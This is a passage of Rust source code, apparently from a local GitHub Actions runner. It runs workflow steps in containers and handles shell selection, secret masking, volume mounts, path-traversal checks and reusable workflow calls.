                            // Replace the emulated command with a shell command to execute our command
                            cmd.clear();
                            cmd.push("sh");
                            cmd.push("-c");
                            owned_strings.push(command_str);
                            cmd.push(owned_strings.last().unwrap());
                        } else {
                            // Fall back to emulation for actions we don't know how to execute
                            cmd.clear();
                            cmd.push("sh");
                            cmd.push("-c");

                            let escaped_uses = uses.replace('\'', "'\\''");
                            let echo_msg =
                                format!("echo 'Would execute GitHub action: {}'", escaped_uses);
                            owned_strings.push(echo_msg);
                            cmd.push(owned_strings.last().unwrap());
                        }
                    }

                    // Convert 'with' parameters to environment variables
                    if let Some(with_params) = &ctx.step.with {
                        for (key, value) in with_params {
                            step_env.insert(format!("INPUT_{}", key.to_uppercase()), value.clone());
                        }
                    }

                    let container_workspace = Path::new("/github/workspace");
                    let mount_ctx = prepare_step_container_context(
                        &mut step_env,
                        ctx.job_env,
                        ctx.container_config,
                    );
                    let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
                    let env_vars: Vec<(&str, &str)> = step_env
                        .iter()
                        .map(|(k, v)| (k.as_str(), v.as_str()))
                        .collect();

                    let output = ctx
                        .runtime
                        .run_container(
                            &image,
                            &cmd.to_vec(),
                            &env_vars,
                            container_workspace,
                            &volumes,
                            None,
                        )
                        .await
                        .map_err(|e| ExecutionError::Runtime(format!("{}", e)))?;

                    // Build verbose output for GitHub actions when applicable
                    let output_text = if ctx.verbose
                        && output.exit_code == 0
                        && uses.contains('/')
                        && !uses.starts_with("./")
                    {
                        let mut detailed_output =
                            format!("Would execute GitHub action: {}\n", uses);

                        // Add information about the action inputs if available
                        if let Some(with_params) = &ctx.step.with {
                            detailed_output.push_str("\nAction inputs:\n");
                            for (key, value) in with_params {
                                detailed_output.push_str(&format!("  {}: {}\n", key, value));
                            }
                        }

                        // Add standard GitHub action environment variables
                        // (mask INPUT_* values since they may contain secrets)
                        detailed_output.push_str("\nEnvironment variables:\n");
                        for (key, value) in step_env.iter() {
                            if key.starts_with("GITHUB_") {
                                detailed_output.push_str(&format!("  {}: {}\n", key, value));
                            } else if key.starts_with("INPUT_") {
                                detailed_output.push_str(&format!("  {}: ***\n", key));
                            }
                        }

                        // Include the original output
                        detailed_output
                            .push_str(&format!("\nOutput:\n{}\n{}", output.stdout, output.stderr));
                        detailed_output
                    } else {
                        format!("{}\n{}", output.stdout, output.stderr)
                    };

                    // Add detailed error information for failed cargo/rust commands
                    if output.exit_code != 0 && (uses.contains("cargo") || uses.contains("rust")) {
                        let mut error_details = format!(
                            "\n\n{} Command failed with exit code: {}\n",
                            wrkflw_logging::symbols::FAILURE,
                            output.exit_code
                        );

                        error_details.push_str(&format!("Command: {}\n", cmd.join(" ")));

                        error_details.push_str("\nEnvironment:\n");
                        for (key, value) in step_env.iter() {
                            if key.starts_with("GITHUB_") || key.starts_with("RUST") {
                                error_details.push_str(&format!("  {}: {}\n", key, value));
                            } else if key.starts_with("INPUT_") {
                                error_details.push_str(&format!("  {}: ***\n", key));
                            }
                        }

                        error_details.push_str("\nDetailed output:\n");
                        error_details.push_str(&output.stdout);
                        error_details.push_str(&output.stderr);

                        return Ok(StepResult::new(
                            step_name,
                            StepStatus::Failure,
                            format!("{}\n{}", output_text, error_details),
                        ));
                    }

                    StepResult::new(
                        step_name,
                        if output.exit_code == 0 {
                            StepStatus::Success
                        } else {
                            StepStatus::Failure
                        },
                        format!(
                            "Exit code: {}\n{}\n{}",
                            output.exit_code, output.stdout, output.stderr
                        ),
                    )
                }
            }
        }
    } else if let Some(run) = &ctx.step.run {
        // Run step
        let mut output = String::new();
        let mut status = StepStatus::Success;
        let mut error_details = None;

        // Perform secret substitution if secret manager is available
        let resolved_run = if let Some(secret_manager) = ctx.services.secret_manager {
            let mut substitution = SecretSubstitution::new(secret_manager);
            match substitution.substitute(run).await {
                Ok(resolved) => resolved,
                Err(e) => {
                    return Ok(StepResult::new(
                        step_name,
                        StepStatus::Failure,
                        format!("Secret substitution failed: {}", e),
                    ));
                }
            }
        } else {
            run.clone()
        };

        // Resolve expression substitutions (hashFiles, step outputs, env, matrix vars)
        let run_expr_ctx = ctx.expr_context();
        let resolved_run = match crate::substitution::preprocess_expressions(
            &resolved_run,
            ctx.working_dir,
            &run_expr_ctx,
        ) {
            Ok(r) => r,
            Err(e) => {
                return Ok(StepResult::new(
                    step_name,
                    StepStatus::Failure,
                    format!("Expression substitution failed: {}", e),
                ));
            }
        };

        // Check if this is a cargo command
        let is_cargo_cmd = resolved_run.trim().starts_with("cargo");

        // Resolve effective shell: step > job defaults > workflow defaults > "bash"
        let effective_shell = ctx
            .step
            .shell
            .as_deref()
            .or_else(|| {
                ctx.job_defaults
                    .and_then(|d| d.run.as_ref()?.shell.as_deref())
            })
            .or_else(|| {
                ctx.workflow_defaults
                    .and_then(|d| d.run.as_ref()?.shell.as_deref())
            })
            .unwrap_or("bash");

        let cmd_parts = match effective_shell {
            "bash" => vec![
                "bash",
                "--noprofile",
                "--norc",
                "-e",
                "-o",
                "pipefail",
                "-c",
                &resolved_run,
            ],
            "sh" => vec!["sh", "-e", "-c", &resolved_run],
            "python" => vec!["python", "-c", &resolved_run],
            "pwsh" | "powershell" => vec!["pwsh", "-command", &resolved_run],
            other => {
                wrkflw_logging::warning(&format!(
                    "  Unrecognized shell '{}', falling back to '{} -c'",
                    other, other
                ));
                vec![other, "-c", &resolved_run]
            }
        };

        // Resolve effective working directory: step > job defaults > workflow defaults
        let effective_wd = ctx
            .step
            .working_directory
            .as_deref()
            .or_else(|| {
                ctx.job_defaults
                    .and_then(|d| d.run.as_ref()?.working_directory.as_deref())
            })
            .or_else(|| {
                ctx.workflow_defaults
                    .and_then(|d| d.run.as_ref()?.working_directory.as_deref())
            });

        // Define the standard workspace path inside the container
        let container_workspace = Path::new("/github/workspace");
        let final_workspace = if let Some(wd) = effective_wd {
            let joined = container_workspace.join(wd);
            // Canonicalize logically to catch ".." traversal and absolute path replacement
            let mut normalized = std::path::PathBuf::new();
            for component in joined.components() {
                match component {
                    std::path::Component::ParentDir => {
                        normalized.pop();
                    }
                    c => normalized.push(c.as_os_str()),
                }
            }
            if !normalized.starts_with(container_workspace) {
                return Ok(StepResult::new(
                    step_name,
                    StepStatus::Failure,
                    format!(
                        "Invalid working-directory '{}': must be within workspace",
                        wd
                    ),
                ));
            }
            normalized
        } else {
            container_workspace.to_path_buf()
        };

        let mount_ctx =
            prepare_step_container_context(&mut step_env, ctx.job_env, ctx.container_config);
        let volumes = mount_ctx.build_volumes(ctx.working_dir, container_workspace);
        let env_vars: Vec<(&str, &str)> = step_env
            .iter()
            .map(|(k, v)| (k.as_str(), v.as_str()))
            .collect();

        // Execute the command
        match ctx
            .runtime
            .run_container(
                ctx.runner_image,
                &cmd_parts,
                &env_vars,
                &final_workspace,
                &volumes,
                None,
            )
            .await
        {
            Ok(container_output) => {
                // Add command details to output (show resolved version so
                // users can see expression substitutions were applied)
                output.push_str(&format!("Command: {}\n\n", resolved_run));

                if !container_output.stdout.is_empty() {
                    output.push_str("Standard Output:\n");
                    output.push_str(&container_output.stdout);
                    output.push('\n');
                }

                if !container_output.stderr.is_empty() {
                    output.push_str("Standard Error:\n");
                    output.push_str(&container_output.stderr);
                    output.push('\n');
                }

                if container_output.exit_code != 0 {
                    status = StepStatus::Failure;

                    // For cargo commands, add more detailed error information
                    if is_cargo_cmd {
                        let mut error_msg = String::new();
                        error_msg.push_str(&format!(
                            "\nCargo command failed with exit code {}\n",
                            container_output.exit_code
                        ));
                        error_msg.push_str("Common causes for cargo command failures:\n");

                        if run.contains("fmt") {
                            error_msg.push_str(
                                "- Code formatting issues. Run 'cargo fmt' locally to fix.\n",
                            );
                        } else if run.contains("clippy") {
                            error_msg.push_str("- Linter warnings treated as errors. Run 'cargo clippy' locally to see details.\n");
                        } else if run.contains("test") {
                            error_msg.push_str("- Test failures. Run 'cargo test' locally to see which tests failed.\n");
                        } else if run.contains("build") {
                            error_msg.push_str(
                                "- Compilation errors. Check the error messages above.\n",
                            );
                        }

                        error_details = Some(error_msg);
                    }
                }
            }
            Err(e) => {
                status = StepStatus::Failure;
                output.push_str(&format!("Error executing command: {}\n", e));
            }
        }

        // If there are error details, append them to the output
        if let Some(details) = error_details {
            output.push_str(&details);
        }

        StepResult::new(step_name, status, output)
    } else {
        return Ok(StepResult::new(
            step_name,
            StepStatus::Skipped,
            "Step has neither 'uses' nor 'run'".to_string(),
        ));
    };

    Ok(step_result)
}

/// Create a gitignore matcher for the given directory
fn create_gitignore_matcher(
    dir: &Path,
) -> Result<Option<ignore::gitignore::Gitignore>, ExecutionError> {
    let mut builder = GitignoreBuilder::new(dir);

    // Try to add .gitignore file if it exists
    let gitignore_path = dir.join(".gitignore");
    if gitignore_path.exists() {
        builder.add(&gitignore_path);
    }

    // Add some common ignore patterns as fallback
    builder.add_line(None, "target/").map_err(|e| {
        ExecutionError::Execution(format!("Failed to add default ignore pattern: {}", e))
    })?;
    builder.add_line(None, ".git/").map_err(|e| {
        ExecutionError::Execution(format!("Failed to add default ignore pattern: {}", e))
    })?;

    match builder.build() {
        Ok(gitignore) => Ok(Some(gitignore)),
        Err(e) => {
            wrkflw_logging::warning(&format!("Failed to build gitignore matcher: {}", e));
            Ok(None)
        }
    }
}

fn copy_directory_contents(from: &Path, to: &Path) -> Result<(), ExecutionError> {
    copy_directory_contents_with_gitignore(from, to, None)
}

fn copy_directory_contents_with_gitignore(
    from: &Path,
    to: &Path,
    gitignore: Option<&ignore::gitignore::Gitignore>,
) -> Result<(), ExecutionError> {
    // If no gitignore provided, try to create one for the root directory
    let root_gitignore;
    let gitignore = if gitignore.is_none() {
        root_gitignore = create_gitignore_matcher(from)?;
        root_gitignore.as_ref()
    } else {
        gitignore
    };

    // Log summary of the copy operation
    wrkflw_logging::debug(&format!(
        "Copying directory contents from {} to {}",
        from.display(),
        to.display()
    ));

    for entry in std::fs::read_dir(from)
        .map_err(|e| ExecutionError::Execution(format!("Failed to read directory: {}", e)))?
    {
        let entry =
            entry.map_err(|e| ExecutionError::Execution(format!("Failed to read entry: {}", e)))?;
        let path = entry.path();

        if path.is_symlink() {
            wrkflw_logging::debug(&format!("Skipping symlink: {:?}", path));
            continue;
        }

        // Check if the file should be ignored according to .gitignore
        if let Some(gitignore) = gitignore {
            let relative_path = path.strip_prefix(from).unwrap_or(&path);
            match gitignore.matched(relative_path, path.is_dir()) {
                Match::Ignore(_) => {
                    wrkflw_logging::debug(&format!("Skipping ignored file/directory: {path:?}"));
                    continue;
                }
                Match::Whitelist(_) | Match::None => {
                    // File is not ignored or explicitly whitelisted
                }
            }
        }

        // Log individual files only in trace mode (removed verbose per-file logging)

        // Additional basic filtering for hidden files (but allow .gitignore and .github)
        let file_name = match path.file_name() {
            Some(name) => name.to_string_lossy(),
            None => {
                return Err(ExecutionError::Execution(format!(
                    "Failed to get file name from path: {:?}",
                    path
                )));
            }
        };

        // Skip most hidden files but allow important ones
        if file_name.starts_with(".")
            && file_name != ".gitignore"
            && file_name != ".github"
            && !file_name.starts_with(".env")
        {
            continue;
        }

        let dest_path = match path.file_name() {
            Some(name) => to.join(name),
            None => {
                return Err(ExecutionError::Execution(format!(
                    "Failed to get file name from path: {:?}",
                    path
                )));
            }
        };

        if path.is_dir() {
            std::fs::create_dir_all(&dest_path)
                .map_err(|e| ExecutionError::Execution(format!("Failed to create dir: {}", e)))?;

            // Recursively copy subdirectories with the same gitignore
            copy_directory_contents_with_gitignore(&path, &dest_path, gitignore)?;
        } else {
            std::fs::copy(&path, &dest_path)
                .map_err(|e| ExecutionError::Execution(format!("Failed to copy file: {}", e)))?;
        }
    }

    Ok(())
}

fn get_runner_image(runs_on: &str) -> String {
    // Map GitHub runners to Docker images
    match runs_on.trim() {
        // ubuntu runners - using Ubuntu base images for better compatibility
        "ubuntu-latest" => "ubuntu:latest",
        "ubuntu-22.04" => "ubuntu:22.04",
        "ubuntu-20.04" => "ubuntu:20.04",
        "ubuntu-18.04" => "ubuntu:18.04",

        // ubuntu runners - medium images (with more tools)
        "ubuntu-latest-medium" => "catthehacker/ubuntu:act-latest",
        "ubuntu-22.04-medium" => "catthehacker/ubuntu:act-22.04",
        "ubuntu-20.04-medium" => "catthehacker/ubuntu:act-20.04",
        "ubuntu-18.04-medium" => "catthehacker/ubuntu:act-18.04",

        // ubuntu runners - large images (with most tools)
        "ubuntu-latest-large" => "catthehacker/ubuntu:full-latest",
        "ubuntu-22.04-large" => "catthehacker/ubuntu:full-22.04",
        "ubuntu-20.04-large" => "catthehacker/ubuntu:full-20.04",
        "ubuntu-18.04-large" => "catthehacker/ubuntu:full-18.04",

        // macOS runners - use a standard Rust image for compatibility
        "macos-latest" => "rust:latest",
        "macos-12" => "rust:latest",    // Monterey equivalent
        "macos-11" => "rust:latest",    // Big Sur equivalent
        "macos-10.15" => "rust:latest", // Catalina equivalent

        // Windows runners - using servercore-based images
        "windows-latest" => "mcr.microsoft.com/windows/servercore:ltsc2022",
        "windows-2022" => "mcr.microsoft.com/windows/servercore:ltsc2022",
        "windows-2019" => "mcr.microsoft.com/windows/servercore:ltsc2019",

        // Language-specific runners
        "python-latest" => "python:3.11-slim",
        "python-3.11" => "python:3.11-slim",
        "python-3.10" => "python:3.10-slim",
        "python-3.9" => "python:3.9-slim",
        "python-3.8" => "python:3.8-slim",

        "node-latest" => "node:20-slim",
        "node-20" => "node:20-slim",
        "node-18" => "node:18-slim",
        "node-16" => "node:16-slim",

        "java-latest" => "eclipse-temurin:17-jdk",
        "java-17" => "eclipse-temurin:17-jdk",
        "java-11" => "eclipse-temurin:11-jdk",
        "java-8" => "eclipse-temurin:8-jdk",

        "go-latest" => "golang:1.21-slim",
        "go-1.21" => "golang:1.21-slim",
        "go-1.20" => "golang:1.20-slim",
        "go-1.19" => "golang:1.19-slim",

        "dotnet-latest" => "mcr.microsoft.com/dotnet/sdk:7.0",
        "dotnet-7.0" => "mcr.microsoft.com/dotnet/sdk:7.0",
        "dotnet-6.0" => "mcr.microsoft.com/dotnet/sdk:6.0",
        "dotnet-5.0" => "mcr.microsoft.com/dotnet/sdk:5.0",

        // Default case for other runners or custom strings
        _ => {
            // Check for platform prefixes and provide appropriate images
            let runs_on_lower = runs_on.trim().to_lowercase();
            if runs_on_lower.starts_with("macos") {
                "rust:latest" // Use Rust image for macOS runners
            } else if runs_on_lower.starts_with("windows") {
                "mcr.microsoft.com/windows/servercore:ltsc2022" // Default Windows image
            } else if runs_on_lower.starts_with("python") {
                "python:3.11-slim" // Default Python image
            } else if runs_on_lower.starts_with("node") {
                "node:20-slim" // Default Node.js image
            } else if runs_on_lower.starts_with("java") {
                "eclipse-temurin:17-jdk" // Default Java image
            } else if runs_on_lower.starts_with("go") {
                "golang:1.21-slim" // Default Go image
            } else if runs_on_lower.starts_with("dotnet") {
                "mcr.microsoft.com/dotnet/sdk:7.0" // Default .NET image
            } else {
                "ubuntu:latest" // Default to Ubuntu for everything else
            }
        }
    }
    .to_string()
}

fn get_runner_image_from_opt(runs_on: &Option<Vec<String>>) -> String {
    let default = "ubuntu-latest";
    let ro = runs_on
        .as_ref()
        .and_then(|vec| vec.first())
        .map(|s| s.as_str())
        .unwrap_or(default);
    get_runner_image(ro)
}

fn get_effective_runner_image(job: &Job) -> String {
    if let Some(ref container) = job.container {
        if container.image.is_empty() {
            wrkflw_logging::warning("container image is empty, falling back to runs-on");
            get_runner_image_from_opt(&job.runs_on)
        } else {
            container.image.clone()
        }
    } else {
        get_runner_image_from_opt(&job.runs_on)
    }
}

/// Owned data returned by [`prepare_step_container_context`].
///
/// The caller should derive `&[(&Path, &Path)]` and `&[(&str, &str)]` references
/// from this struct's fields before passing them to `run_container`.
struct StepContainerContext {
    owned_volume_paths: Vec<VolumePathPair>,
    github_mount: Option<VolumePathPair>,
}

impl StepContainerContext {
    /// Build the final volumes slice by appending all owned mounts after the
    /// initial `(working_dir, container_workspace)` pair.
    fn build_volumes<'a>(
        &'a self,
        working_dir: &'a Path,
        container_workspace: &'a Path,
    ) -> Vec<(&'a Path, &'a Path)> {
        let mut volumes: Vec<(&Path, &Path)> = vec![(working_dir, container_workspace)];
        if let Some((ref host, ref container)) = self.github_mount {
            volumes.push((host.as_path(), container.as_path()));
        }
        for (host, container) in &self.owned_volume_paths {
            volumes.push((host.as_path(), container.as_path()));
        }
        volumes
    }
}

/// Set up container volumes and remap GitHub env paths for a step execution.
///
/// This is the common setup shared by `NativeDocker`, `Image`, and `run` step
/// execution paths.  Returns owned mount data; the caller uses
/// [`StepContainerContext::build_volumes`] to borrow into it.
fn prepare_step_container_context(
    step_env: &mut HashMap<String, String>,
    job_env: &HashMap<String, String>,
    container_config: Option<&JobContainer>,
) -> StepContainerContext {
    let (owned_volume_paths, github_mount) =
        prepare_container_mounts(step_env, job_env, container_config);
    StepContainerContext {
        owned_volume_paths,
        github_mount,
    }
}

type VolumePathPair = (PathBuf, PathBuf);

/// Prepare container volume mounts and remap GitHub environment file paths for container runtimes.
///
/// Returns owned volume path pairs that should be appended to the volumes list,
/// and mutates `step_env` to remap GITHUB_ENV/GITHUB_OUTPUT/GITHUB_PATH/GITHUB_STEP_SUMMARY
/// to container-internal paths when running under Docker/Podman.
fn prepare_container_mounts(
    step_env: &mut HashMap<String, String>,
    job_env: &HashMap<String, String>,
    container_config: Option<&JobContainer>,
) -> (Vec<VolumePathPair>, Option<VolumePathPair>) {
    let container_github_dir = Path::new("/github/workflow");
    let is_container_runtime = step_env
        .get("WRKFLW_RUNTIME_MODE")
        .map(|m| m == "docker" || m == "podman")
        .unwrap_or(false);

    // Mount GitHub environment files directory and remap paths
    let github_mount = if let Some(github_env_path) = job_env.get("GITHUB_ENV") {
        if let Some(github_dir) = Path::new(github_env_path).parent() {
            if is_container_runtime {
                // Remap each GitHub env file path by deriving the filename from the actual
                // host path, so the mapping stays correct if environment.rs renames them.
                // Only remap keys that actually exist in job_env to avoid phantom paths.
                for env_key in &[
                    "GITHUB_ENV",
                    "GITHUB_OUTPUT",
                    "GITHUB_PATH",
                    "GITHUB_STEP_SUMMARY",
                ] {
                    if let Some(host_path) = job_env.get(*env_key) {
                        if let Some(filename) = Path::new(host_path).file_name() {
                            step_env.insert(
                                env_key.to_string(),
                                format!("/github/workflow/{}", filename.to_string_lossy()),
                            );
                        }
                    }
                }
                Some((github_dir.to_path_buf(), container_github_dir.to_path_buf()))
            } else {
                github_dir
                    .parent()
                    .map(|p| (p.to_path_buf(), p.to_path_buf()))
            }
        } else {
            None
        }
    } else {
        None
    };

    // Collect container-defined volumes
    // Docker volume syntax: host:container[:options] — splitn(3) handles the optional :ro/:rw
    let mut owned_volume_paths: Vec<VolumePathPair> = Vec::new();
    if let Some(container_volumes) = container_config.and_then(|c| c.volumes.as_ref()) {
        for vol_spec in container_volumes {
            if vol_spec.is_empty() {
                wrkflw_logging::warning("skipping empty volume spec");
                continue;
            }
            // NOTE: splitn(3, ':') won't correctly handle Windows-style host paths (e.g. C:\data:/container)
            let parts: Vec<&str> = vol_spec.splitn(3, ':').collect();
            // Check host path for path traversal (only the host component, not the full spec)
            let host_path = parts[0];
            if std::path::Path::new(host_path)
                .components()
                .any(|c| matches!(c, std::path::Component::ParentDir))
            {
                wrkflw_logging::warning(&format!(
                    "Skipping volume with path traversal in host path: {}",
                    vol_spec
                ));
                continue;
            }
            match parts.len() {
                3 => {
                    if parts[0].is_empty() || parts[1].is_empty() {
                        wrkflw_logging::warning(&format!(
                            "skipping volume spec with empty host or container path: '{}'",
                            vol_spec
                        ));
                        continue;
                    }
                    wrkflw_logging::warning(&format!(
                        "volume mount option '{}' in '{}' is not yet supported and will be ignored",
                        parts[2], vol_spec
                    ));
                    owned_volume_paths.push((PathBuf::from(parts[0]), PathBuf::from(parts[1])));
                }
                2 => {
                    if parts[0].is_empty() || parts[1].is_empty() {
                        wrkflw_logging::warning(&format!(
                            "skipping volume spec with empty host or container path: '{}'",
                            vol_spec
                        ));
                        continue;
                    }
                    owned_volume_paths.push((PathBuf::from(parts[0]), PathBuf::from(parts[1])));
                }
                _ => {
                    // Single path: mount at same location inside container
                    let p = PathBuf::from(parts[0]);
                    owned_volume_paths.push((p.clone(), p));
                }
            }
        }
    }

    (owned_volume_paths, github_mount)
}

/// Log warnings for container fields that are parsed but not yet supported.
fn warn_unsupported_container_fields(container: &JobContainer) {
    if container.options.is_some() {
        wrkflw_logging::warning(
            "container 'options' field is not yet supported and will be ignored",
        );
    }
    if container.credentials.is_some() {
        wrkflw_logging::warning(
            "container 'credentials' field is not yet supported and will be ignored",
        );
    }
    if container.ports.is_some() {
        wrkflw_logging::warning(
            "container 'ports' field is not yet supported (service containers are not implemented)",
        );
    }
}

async fn execute_reusable_workflow_job(
    ctx: &JobExecutionContext<'_>,
    uses: &str,
    with: Option<&HashMap<String, String>>,
    secrets: Option<&serde_yaml::Value>,
) -> Result<JobResult, ExecutionError> {
    wrkflw_logging::info(&format!(
        "Executing reusable workflow job '{}' -> {}",
        ctx.job_name, uses
    ));

    // Resolve the called workflow file path
    enum UsesRef<'a> {
        LocalPath(&'a str),
        Remote {
            owner: String,
            repo: String,
            path: String,
            r#ref: String,
        },
    }

    let uses_ref = if uses.starts_with("./") || uses.starts_with('/') {
        UsesRef::LocalPath(uses)
    } else {
        // Expect format owner/repo/path/to/workflow.yml@ref
        let parts: Vec<&str> = uses.split('@').collect();
        if parts.len() != 2 {
            return Err(ExecutionError::Execution(format!(
                "Invalid reusable workflow reference: {}",
                uses
            )));
        }
        let left = parts[0];
        let r#ref = parts[1].to_string();
        let mut segs = left.splitn(3, '/');
        let owner = segs.next().unwrap_or("").to_string();
        let repo = segs.next().unwrap_or("").to_string();
        let path = segs.next().unwrap_or("").to_string();
        if owner.is_empty() || repo.is_empty() || path.is_empty() {
            return Err(ExecutionError::Execution(format!(
                "Invalid reusable workflow reference: {}",
                uses
            )));
        }
        UsesRef::Remote {
            owner,
            repo,
            path,
            r#ref,
        }
    };

    // Load workflow file
    let workflow_path = match uses_ref {
        UsesRef::LocalPath(p) => {
            // Resolve relative to current directory
            let current_dir = std::env::current_dir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to get current dir: {}", e))
            })?;
            let path = current_dir.join(p);
            if !path.exists() {
                return Err(ExecutionError::Execution(format!(
                    "Reusable workflow not found at path: {}",
                    path.display()
                )));
            }
            // Validate the resolved path stays within the repository root
            // to prevent path traversal via `uses: /etc/some-file` or `uses: ../../escape`.
            if let Ok(canonical) = path.canonicalize() {
                if let Ok(canonical_cwd) = current_dir.canonicalize() {
                    if !canonical.starts_with(&canonical_cwd) {
                        return Err(ExecutionError::Execution(format!(
                            "Reusable workflow path '{}' escapes the repository root",
                            p
                        )));
                    }
                }
            }
            path
        }
        UsesRef::Remote {
            owner,
            repo,
            path,
            r#ref,
        } => {
            // Clone minimal repository and checkout ref
            let tempdir = tempfile::tempdir().map_err(|e| {
                ExecutionError::Execution(format!("Failed to create temp dir: {}", e))
            })?;
            let repo_url = format!("https://github.com/{}/{}.git", owner, repo);

            // Clone into a subdirectory within tempdir to get clean structure
            let repo_dir = tempdir.path().join("cloned_repo");

            shallow_clone(&repo_url, &r#ref, &repo_dir).await?;
            let joined = repo_dir.join(path);

            if !joined.exists() {
                return Err(ExecutionError::Execution(format!(
                    "Reusable workflow file not found in repo: {}",
                    joined.display()
                )));
            }

            // Parse called workflow while keeping tempdir alive
            let called = parse_workflow(&joined)?;

            return run_called_workflow(ctx, &called, uses, with, secrets, &joined).await;
        }
    };

    // Parse called workflow (for local paths)
    let called = parse_workflow(&workflow_path)?;

    run_called_workflow(ctx, &called, uses, with, secrets, &workflow_path).await
}

/// Shared logic for executing a parsed reusable workflow: builds child env,
/// propagates secrets, runs batches, and aggregates results into a single `JobResult`.
async fn run_called_workflow(
    ctx: &JobExecutionContext<'_>,
    called: &WorkflowDefinition,
    uses: &str,
    with: Option<&HashMap<String, String>>,
    secrets: Option<&serde_yaml::Value>,
    workflow_path: &Path,
) -> Result<JobResult, ExecutionError> {
    // Create child env context
    let mut child_env = ctx.env_context.clone();
    if let Some(with_map) = with {
        for (k, v) in with_map {
            child_env.insert(format!("INPUT_{}", k.to_uppercase()), v.clone());
        }
    }
    if let Some(secrets_val) = secrets {
        if secrets_val.as_str() == Some("inherit") {
            // Propagate all parent secrets to the child workflow
            for (name, value) in ctx.services.secrets_context {
                child_env.insert(format!("SECRET_{}", name.to_uppercase()), value.clone());
            }
        } else if let Some(map) = secrets_val.as_mapping() {
            for (k, v) in map {
                if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                    child_env.insert(format!("SECRET_{}", key.to_uppercase()), value.to_string());
                }
            }
        }
    }

    // Execute called workflow, reusing parent's secret manager, masker,
    // artifact/cache stores so that `secrets.*` expressions and shared
    // stores work inside the called workflow.
    let plan = dependency::resolve_dependencies(called)?;
    let mut all_results = Vec::new();
    let mut any_failed = false;
    let mut reusable_job_outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
    let mut reusable_job_results: HashMap<String, String> = HashMap::new();
    for batch in plan {
        let results = execute_job_batch(
            &batch,
            called,
            ctx.runtime,
            &child_env,
            ctx.verbose,
            ctx.services.secret_manager,
            ctx.services.secret_masker,
            &reusable_job_outputs,
            &reusable_job_results,
            ctx.services.artifact_store,
            ctx.services.cache_store,
        )
        .await?;
        for r in &results {
            if r.status == JobStatus::Failure {
                any_failed = true;
            }
            reusable_job_results.insert(r.canonical_name.clone(), r.status.to_string());
            reusable_job_outputs.insert(r.canonical_name.clone(), r.outputs.clone());
        }
        all_results.extend(results);
    }

    // Summarize into a single JobResult
    let mut logs = String::new();
    logs.push_str(&format!("Called workflow: {}\n", workflow_path.display()));
    for r in &all_results {
        logs.push_str(&format!("- {}: {:?}\n", r.name, r.status));
    }

    // Represent as one summary step for UI
    let summary_step = StepResult::new(
        format!("Run reusable workflow: {}", uses),
        if any_failed {
            StepStatus::Failure
        } else {
            StepStatus::Success
        },
        logs.clone(),
    );

    // Aggregate outputs from all jobs in the called workflow
    let outputs = aggregate_reusable_workflow_outputs(&reusable_job_outputs);

    Ok(JobResult {
        name: ctx.job_name.to_string(),
        canonical_name: ctx.job_name.to_string(),
        status: if any_failed {
            JobStatus::Failure
        } else {
            JobStatus::Success
        },
        steps: vec![summary_step],
        logs,
        outputs,
    })
}

/// Merge per-job outputs from a reusable workflow into a flat map.
///
/// In GitHub Actions, reusable workflow outputs are declared via
/// `on.workflow_call.outputs` which maps output names to job output
/// expressions. Since we don't parse that declaration yet, we use a
/// pragmatic approximation: flatten all job outputs into a single map.
/// Jobs are iterated in sorted order by name for deterministic merging;
/// later jobs (alphabetically) overwrite earlier jobs if keys collide.
fn aggregate_reusable_workflow_outputs(
    job_outputs: &HashMap<String, HashMap<String, String>>,
) -> HashMap<String, String> {
    let mut merged = HashMap::new();
    // Sort by job name for deterministic output when keys collide
    let mut sorted_jobs: Vec<_> = job_outputs.iter().collect();
    sorted_jobs.sort_by(|a, b| a.0.cmp(b.0));
    for (job_name, outputs) in sorted_jobs {
        for (key, value) in outputs {
            if !value.is_empty() {
                if let Some(prev) = merged.insert(key.clone(), value.clone()) {
                    if prev != *value {
                        wrkflw_logging::warning(&format!(
                            "Reusable workflow output key '{}' from job '{}' overwrites \
                             a different value set by an earlier job",
                            key, job_name
                        ));
                    }
                }
            }
        }
    }
    merged
}

#[allow(dead_code)]
async fn prepare_runner_image(
    image: &str,
    runtime: &dyn ContainerRuntime,
    verbose: bool,
) -> Result<(), ExecutionError> {
    // Try to pull the image first
    if let Err(e) = runtime.pull_image(image).await {
        wrkflw_logging::warning(&format!("Failed to pull image {}: {}", image, e));
    }

    // Check if this is a language-specific runner
    let language_info = extract_language_info(image);
    if let Some((language, version)) = language_info {
        // Try to prepare a language-specific environment
        if let Ok(custom_image) = runtime
            .prepare_language_environment(language, version, None)
            .await
            .map_err(|e| ExecutionError::Runtime(e.to_string()))
        {
            if verbose {
                wrkflw_logging::info(&format!("Using customized image: {}", custom_image));
            }
            return Ok(());
        }
    }

    Ok(())
}

#[allow(dead_code)]
fn extract_language_info(image: &str) -> Option<(&'static str, Option<&str>)> {
    let image_lower = image.to_lowercase();

    // Check for language-specific images
    if image_lower.starts_with("python:") {
        Some(("python", Some(&image[7..])))
    } else if image_lower.starts_with("node:") {
        Some(("node", Some(&image[5..])))
    } else if image_lower.starts_with("eclipse-temurin:") {
        Some(("java", Some(&image[15..])))
    } else if image_lower.starts_with("golang:") {
        Some(("go", Some(&image[6..])))
    } else if image_lower.starts_with("mcr.microsoft.com/dotnet/sdk:") {
        Some(("dotnet", Some(&image[29..])))
    } else if image_lower.starts_with("rust:") {
        Some(("rust", Some(&image[5..])))
    } else {
        None
    }
}

#[allow(clippy::too_many_arguments)]
async fn execute_composite_action(
    step: &workflow::Step,
    action_path: &Path,
    job_env: &HashMap<String, String>,
    working_dir: &Path,
    runtime: &dyn ContainerRuntime,
    runner_image: &str,
    verbose: bool,
    services: &JobServices<'_>,
    pending_cache_saves: &std::sync::Mutex<Vec<PendingCacheSave>>,
) -> Result<StepResult, ExecutionError> {
    // Find the action definition file
    let action_yaml = action_path.join("action.yml");
    let action_yaml_alt = action_path.join("action.yaml");

    let action_file = if action_yaml.exists() {
        action_yaml
    } else if action_yaml_alt.exists() {
        action_yaml_alt
    } else {
        return Err(ExecutionError::Execution(format!(
            "No action.yml or action.yaml found in {}",
            action_path.display()
        )));
    };

    // Parse the composite action definition
    let action_content = fs::read_to_string(&action_file)
        .map_err(|e| ExecutionError::Execution(format!("Failed to read action file: {}", e)))?;

    let action_def: serde_yaml::Value = serde_yaml::from_str(&action_content)
        .map_err(|e| ExecutionError::Execution(format!("Invalid action YAML: {}", e)))?;

    // Check if it's a composite action
